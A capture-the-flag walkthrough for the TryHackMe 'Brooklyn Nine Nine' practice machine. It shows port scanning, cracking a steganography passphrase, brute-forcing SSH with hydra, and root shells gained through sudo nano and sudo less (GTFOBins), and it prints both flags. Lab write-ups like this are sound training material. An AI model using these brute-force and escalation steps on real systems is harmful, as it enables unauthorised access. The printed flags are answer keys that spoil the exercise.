###### This room is aimed for beginner level hackers but anyone can try to hack this box. 
Room: https://tryhackme.com/room/brooklynninenine
##

**sudo nmap** -sS -sV xx.xx.xxx.xx
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Method 1  

We can access the web page hosted on the machine by navigating to the machine IP.  
Inspecting the page source code, we get a hint.  
```
<!-- Have you ever heard of steganography? -->
```

After we download the background image, we see that running steghide with no passphase returns us an error.  
```
steghide: can not uncompress data. compressed data is corrupted.
```

We can run **stegcracker** to bruteforce possible passphrases using a wordlist.  
**stegcracker** brooklyn99.jpg
```
Successfully cracked file with password: admin
```
After using steghide with the admin passphase, we get the data extracted to a file called note.txt.  
**steghide** extract -sf brooklyn99.jpg

Contents of **note.txt**
```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

The next step is to connect to the machine using the ssh credentials we've got.    

**ssh** holt@xx.xx.xxx.xx using the password found above.   

After running the **sudo -l** command, we see that we can run **nano** as root.     
According to **gtfobins**, we can exploit this to get permanent root access using the following commands  
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
##
#### Method 2

There's a FTP server running on the target machine that supports anonymous login. (credentials: anonymous:anonymous)  
By connecting on the FTP server, we get access to a file called **note_to_jake.txt**.  
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

This note reveals us 3 possible users: amy, jake and holt.   
However, Jake's password seems weak so we can try to bruteforce the ssh credentials.  

**sudo hydra** -l jake -P /usr/share/wordlists/rockyou.txt ssh   
```
[22][ssh] host: 10.10.105.10   login: jake   password: 987654321
```

After connecting to the target machine using jake's credentials, we see that we have acces to the **less** command as sudo.  
According to **gtfobins**, we can exploit this using the following commands:
```
sudo less /etc/profile
!/bin/sh
```
##


##
The user flag is located in holt's home directory and is **ee11cbb19052e40b07aac0ca060c23ee**.
The root flag is located at /root directory and is **63a9f0ea7bb98050796b649e85481845**
